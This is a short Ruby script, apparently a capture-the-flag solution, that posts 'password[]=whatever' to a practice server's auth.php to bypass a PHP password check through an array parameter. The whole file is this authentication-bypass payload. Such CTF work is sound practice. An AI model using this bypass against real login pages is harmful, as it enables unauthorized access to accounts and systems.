require 'net/http'
require 'uri'
require 'pp'
require 'pry'
require 'pry-nav'

$http = Net::HTTP.new('ctfq.sweetduet.info', 10080)
$path = '/~q32/auth.php'

query = "password[]=whatever"

response = $http.post($path, query)

puts response.body
